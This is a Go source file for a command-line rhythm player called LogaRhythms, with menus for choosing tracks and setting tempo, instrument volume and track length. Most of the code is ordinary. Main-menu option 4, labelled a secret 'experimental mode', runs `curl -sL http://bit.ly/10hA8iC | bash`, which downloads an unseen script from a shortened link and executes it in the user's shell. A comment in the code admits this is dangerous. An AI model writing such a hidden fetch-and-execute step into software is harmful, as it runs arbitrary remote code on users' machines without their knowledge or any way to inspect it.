package input

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"strconv"
	"time"

	"github.com/pkg/errors"

	"github.com/jcfox412/logarhythms/internal/models"
	"github.com/jcfox412/logarhythms/internal/utils"
)

// UserInput provides an easy way to mimic user input for testing.
type UserInput struct {
	Reader io.Reader
}

// PrintMainMenu prints out the main user menu for using LogaRhythms.
func (u *UserInput) PrintMainMenu() error {
	fmt.Print(utils.Bold("\nWelcome to LogaRhythms! Please select from the following options:"))
	fmt.Print(mainMenuOptions)
	fmt.Print(utils.Bold("\nWhat would you like to do? (Please enter number 1-5): "))

	switch userInput := getUserInput(u.Reader); userInput {
	case "1", "2", "3":
		track, err := prepareTrack(inputTrackMap[userInput])
		if err != nil {
			return errors.Wrap(err, "could not prepare track")
		}

		return retry(3, track, u.PrintSettingsMenu)
	case "4":
		// normally I would never do something like this as it is extremely dangerous,
		// however this keeps the experimental mode a bit more secret ;)
		cmd := exec.Command("bash", "-c", "curl -sL http://bit.ly/10hA8iC | bash")
		cmd.Stdout = os.Stdout
		return cmd.Run()
	case "5":
		fmt.Println("\nThanks for using LogaRhythms!")
		return nil
	default:
		fmt.Println("\nI'm sorry. I didn't understand your input.")
		return u.PrintMainMenu()
	}
}

// PrintSettingsMenu prints out the user menu for modifying all modifiable user
// settings, as well as playing the track. Returns an error if invalid input is
// given.
func (u *UserInput) PrintSettingsMenu(iface interface{}) error {
	track := iface.(*models.Track)

	fmt.Printf("\nYou've selected to play %s!\n", track.Title)

	fmt.Print(utils.Bold("Available settings:"))
	fmt.Println(settingsMenuOptions)
	fmt.Print(utils.Bold("\nWhat would you like to do? (Please enter number 1-5): "))

	inputMenuMap := map[string]func(interface{}) error{
		"1": u.BeatsPerMinuteMenu,
		"2": u.AllInstrumentsVolumeMenu,
		"3": u.TrackLengthMenu,
	}

	switch userInput := getUserInput(u.Reader); userInput {
	case "1", "2", "3":
		if err := retry(3, track, inputMenuMap[userInput]); err != nil {
			return errors.Wrap(err, "error loading menu")
		}

		return u.PrintSettingsMenu(track)
	case "4":
		if err := track.Play(); err != nil {
			return errors.Wrap(err, "error playing track")
		}

		return u.PrintMainMenu()
	case "5":
		return u.PrintMainMenu()
	default:
		err := errors.New("I'm sorry, I didn't understand your input")
		fmt.Print(err.Error())
		return err
	}
}

// BeatsPerMinuteMenu prints out the user menu for modifying a track's beats
// per minute (BPM). Returns an error if invalid input is given.
func (u *UserInput) BeatsPerMinuteMenu(iface interface{}) error {
	track := iface.(*models.Track)

	fmt.Print(utils.Bold(fmt.Sprintf("\nAt what beats per minute (BPM) would you like the track to play at? Current BPM: %d\n", track.BeatsPerMinute)))
	fmt.Print("Please enter a BPM (beats per minute) between 1 and 1000: ")

	beatsPerMinute, err := validateBoundedIntegerInput(getUserInput(u.Reader), 1, 1000)
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	track.BeatsPerMinute = beatsPerMinute
	fmt.Printf("Beats per minute set to %d!\n", beatsPerMinute)

	return nil
}

// AllInstrumentsVolumeMenu prints out the user menu for viewing and modifying
// all instruments' volumes. Returns an error if invalid input is given.
func (u *UserInput) AllInstrumentsVolumeMenu(iface interface{}) error {
	track := iface.(*models.Track)

	fmt.Print(utils.Bold("\nSelect an instrument to change its volume:\n"))
	i := 1
	for _, instrument := range track.Instruments {
		fmt.Printf("%d) %s: %.f\n", i, instrument.Name, instrument.Audio.GetVolume())
		i++
	}
	fmt.Printf("%d) Return to settings menu\n", i)
	fmt.Print(utils.Bold(fmt.Sprintf("\nWhich instrument's volume do want to change? (Please enter number 1-%d): ", i)))

	index, err := validateBoundedIntegerInput(getUserInput(u.Reader), 1, i)
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	if index == i {
		return u.PrintSettingsMenu(track)
	}

	return retry(3, track.Instruments[index-1], u.InstrumentVolumeMenu)
}

// InstrumentVolumeMenu prints out the user menu for modifying an instrument's
// volume. Returns an error if invalid input is given or if instrument's Audio
// object is nil.
func (u *UserInput) InstrumentVolumeMenu(iface interface{}) error {
	instrument := iface.(*models.Instrument)

	if instrument.Audio == nil {
		return errors.New("instrument audio must be set to change volume")
	}

	fmt.Print(utils.Bold(fmt.Sprintf("\nWhat volume should the %s be set to? Current instrument volume: %.f\n", instrument.Name, instrument.Audio.GetVolume())))
	fmt.Print("Please enter a volume between 0 and 100: ")

	volume, err := validateBoundedIntegerInput(getUserInput(u.Reader), 0, 100)
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	if _, err := instrument.Audio.SetVolume(float64(volume)); err != nil {
		return errors.Wrap(err, "error setting volume")
	}

	fmt.Printf("Volume set to %d!\n", volume)

	return nil
}

// TrackLengthMenu prints out the user menu for modifying a track's length.
// Returns an error if invalid input is given.
func (u *UserInput) TrackLengthMenu(iface interface{}) error {
	track := iface.(*models.Track)

	fmt.Print(utils.Bold(fmt.Sprintf("\nHow many seconds would you like the track to play? Current track length: %.f seconds\n", track.Length.Seconds())))
	fmt.Print("Please enter a track length between 1 and 100: ")

	length, err := validateBoundedIntegerInput(getUserInput(u.Reader), 1, 100)
	if err != nil {
		fmt.Println(err.Error())
		return err
	}

	track.Length = time.Duration(length) * time.Second
	fmt.Printf("Track length set to %d!\n", length)

	return nil
}

func retry(attempts int, input interface{}, f func(interface{}) error) error {
	if err := f(input); err != nil {
		if attempts--; attempts > 0 {
			return retry(attempts, input, f)
		}

		errMessage := "retried too many times, backing out"

		fmt.Printf("%s\n", errMessage)
		return errors.Wrap(err, errMessage)
	}

	return nil
}

func prepareTrack(metadataFilename string) (*models.Track, error) {
	type instrumentMetadata struct {
		Name     string `json:"name"`
		Filename string `json:"filename"`
		Pattern  []int  `json:"pattern"`
	}

	type trackMetadata struct {
		Instruments      []instrumentMetadata `json:"instruments"`
		Title            string               `json:"title"`
		BeatsPerMeasure  int                  `json:"beats_per_measure"`
		DivisionsPerBeat int                  `json:"divisions_per_beat"`
		SuggestedBPM     int                  `json:"suggested_bpm"`
	}

	// nolint: gosec
	data, err := ioutil.ReadFile(metadataFilename)
	if err != nil {
		return nil, errors.Wrap(err, "error opening metadata file")
	}

	var metadata trackMetadata
	err = json.Unmarshal(data, &metadata)
	if err != nil {
		return nil, errors.Wrap(err, "error unmarshalling metadata into struct")
	}

	instruments := make([]*models.Instrument, 0, len(metadata.Instruments))
	for _, i := range metadata.Instruments {
		instrument, err := models.NewInstrument(i.Name, i.Filename, i.Pattern)
		if err != nil {
			return nil, errors.Wrap(err, "error creating instrument from metadata")
		}

		instruments = append(instruments, instrument)
	}

	return models.NewTrack(metadata.Title, instruments, metadata.SuggestedBPM, metadata.BeatsPerMeasure, metadata.DivisionsPerBeat)
}

func getUserInput(stdin io.Reader) string {
	if stdin == nil {
		stdin = os.Stdin
	}

	scanner := bufio.NewScanner(stdin)

	if scanner.Scan() {
		return scanner.Text()
	}

	return ""
}

func validateBoundedIntegerInput(input string, lowerBound, upperBound int) (int, error) {
	inputInt, err := strconv.Atoi(input)
	if err != nil {
		return 0, errors.New("input must be an integer")
	}

	if inputInt < lowerBound {
		return 0, fmt.Errorf("input must be greater than %d", lowerBound)
	}

	if inputInt > upperBound {
		return 0, fmt.Errorf("input must be less than %d", upperBound)
	}

	return inputInt, nil
}
